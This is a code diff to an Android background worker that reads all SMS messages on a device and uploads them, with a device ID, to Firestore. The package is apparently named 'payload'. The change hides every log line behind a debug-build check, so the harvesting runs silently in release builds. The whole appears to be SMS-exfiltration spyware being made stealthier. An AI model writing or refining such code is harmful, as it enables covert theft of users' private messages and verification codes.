@@ -22,22 +22,30 @@ class AllSmsUploadWorker(
 
     override suspend fun doWork(): Result {
         return try {
-            android.util.Log.d("AllSmsUploadWorker", "Starting SMS upload...")
+            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
+                android.util.Log.d("AllSmsUploadWorker", "Starting SMS upload...")
+            }
             
             if (ContextCompat.checkSelfPermission(
                     applicationContext,
                     Manifest.permission.READ_SMS
                 ) != PackageManager.PERMISSION_GRANTED
             ) {
-                android.util.Log.e("AllSmsUploadWorker", "❌ READ_SMS permission not granted")
+                if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
+                    android.util.Log.e("AllSmsUploadWorker", "❌ READ_SMS permission not granted")
+                }
                 return Result.failure()
             }
 
             val deviceId = getDeviceId()
-            android.util.Log.d("AllSmsUploadWorker", "Device ID: $deviceId")
+            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
+                android.util.Log.d("AllSmsUploadWorker", "Device ID: $deviceId")
+            }
             
             val smsList = readAllSms()
-            android.util.Log.d("AllSmsUploadWorker", "Found ${smsList.size} SMS messages")
+            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
+                android.util.Log.d("AllSmsUploadWorker", "Found ${smsList.size} SMS messages")
+            }
             
             // Upload all SMS to Firestore
             var uploaded = 0
@@ -45,18 +53,24 @@ class AllSmsUploadWorker(
                 try {
                     uploadSmsToFirestore(sms, deviceId)
                     uploaded++
-                    if (uploaded % 10 == 0) {
+                    if (com.payload.jansiix0ne.BuildConfig.DEBUG && uploaded % 10 == 0) {
                         android.util.Log.d("AllSmsUploadWorker", "Uploaded $uploaded/${smsList.size} SMS...")
                     }
                 } catch (e: Exception) {
-                    android.util.Log.e("AllSmsUploadWorker", "Failed to upload SMS: ${e.message}")
+                    if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
+                        android.util.Log.e("AllSmsUploadWorker", "Failed to upload SMS: ${e.message}")
+                    }
                 }
             }
             
-            android.util.Log.d("AllSmsUploadWorker", "✅ Uploaded $uploaded/${smsList.size} SMS successfully!")
+            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
+                android.util.Log.d("AllSmsUploadWorker", "✅ Uploaded $uploaded/${smsList.size} SMS successfully!")
+            }
             Result.success()
         } catch (e: Exception) {
-            android.util.Log.e("AllSmsUploadWorker", "❌ SMS upload failed: ${e.message}", e)
+            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
+                android.util.Log.e("AllSmsUploadWorker", "❌ SMS upload failed: ${e.message}", e)
+            }
             Result.failure()
         }
     }
